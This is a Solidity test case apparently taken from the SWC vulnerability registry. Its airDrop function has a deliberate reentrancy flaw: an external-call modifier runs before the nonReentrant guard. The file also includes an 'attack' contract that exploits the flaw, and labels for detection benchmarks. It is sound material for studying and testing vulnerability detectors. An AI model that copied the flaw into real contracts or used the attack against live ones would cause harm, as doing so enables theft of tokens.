/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
 * @author: - 
 * @vulnerable_at_lines: 15
 */

pragma solidity ^0.4.24;
contract ReentrancyGuard{
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;
    constructor() public{
         _status = _NOT_ENTERED;
    }
    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
       _status = _NOT_ENTERED;
    }
}

contract ModifierEntrancy  is ReentrancyGuard {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  //If a contract has a zero balance and supports the token give them some token
  // <yes> <report> REENTRANCY
  function airDrop() hasNoBalance supportsToken  public nonReentrant {
    tokenBalance[msg.sender] += 20;
  }

  //Checks that the contract responds the way we want
  modifier supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
    _;
  }
  //Checks that the caller has a zero balance
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{ //An example of a contract that breaks the contract above.
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}
